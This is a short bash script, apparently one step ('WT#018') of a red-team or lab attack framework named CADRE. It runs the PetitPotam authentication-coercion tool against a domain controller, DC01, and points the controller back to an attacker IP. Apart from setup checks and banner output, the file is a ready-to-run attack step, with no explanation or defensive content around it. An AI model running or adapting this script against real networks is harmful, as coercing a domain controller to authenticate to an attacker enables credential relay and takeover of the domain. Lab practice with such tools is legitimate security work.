#!/bin/bash
# CADRE — WT#018 PetitPotam
ATTACK_IP="${1:-$(hostname -I | awk '{print $1}')}"
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#018 — PetitPotam"
start_attack "018" "PetitPotam"

require_tool python3
require_env ATTACK_IP "ATTACK_IP"
require_env DC01 "DC01"

step "Step 1: Run PetitPotam against DC01"
run_cmd "python3 /usr/share/Responder/tools/PetitPotam.py $ATTACK_IP $DC01"

result $? "PetitPotam coercion completed"
